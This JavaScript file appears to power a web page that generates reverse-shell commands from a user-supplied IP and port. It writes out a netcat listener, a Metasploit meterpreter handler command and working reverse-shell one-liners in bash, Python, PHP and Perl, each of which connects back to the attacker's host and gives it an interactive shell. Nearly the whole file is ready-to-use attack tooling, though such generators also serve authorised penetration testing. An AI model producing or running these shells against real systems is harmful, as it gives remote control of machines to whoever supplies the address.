function generateListener(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;
    
    var type = document.getElementById("type").value;

    if (ip == "" || port == "") {
        document.getElementById("listener-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("listener-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("listener-code").innerHTML = "Please enter a port."
    } else {
        if (type == "nc") {
            document.getElementById("listener-code").innerHTML = "nc -nlvp " + port.fontcolor("#a55800");
        } else {
            document.getElementById("listener-code").innerHTML = "msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost " + ip.fontcolor("#a55800") + "; set lport " + port.fontcolor("#a55800") + "; exploit'";
        }
    }
}

function generateBash(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "bash -i >& /dev/tcp/" + ip.fontcolor("#a55800") + "/" + port.fontcolor("#a55800") + " 0>&1"

    }
}

function generatePython(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip.fontcolor("#a55800") +  "\"," + port.fontcolor("#a55800") + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    }
}

function generatePhp(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "php -r '$sock=fsockopen(\"" + ip.fontcolor("#a55800") + "\"," + port.fontcolor("#a55800") + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    }
}

function generatePerl(){
    var ip = document.getElementById("ip").value;
    var port = document.getElementById("port").value;

    if (ip == "" || port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address and a port."
    } else if (ip == "") {
        document.getElementById("shell-code").innerHTML = "Please enter an IP address."
    } else if (port == "") {
        document.getElementById("shell-code").innerHTML = "Please enter a port."
    } else {
        document.getElementById("shell-code").innerHTML = "perl -e 'use Socket;$i=\"" + ip.fontcolor("#a55800") + "\";$p=" + port.fontcolor("#a55800") + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

    }
}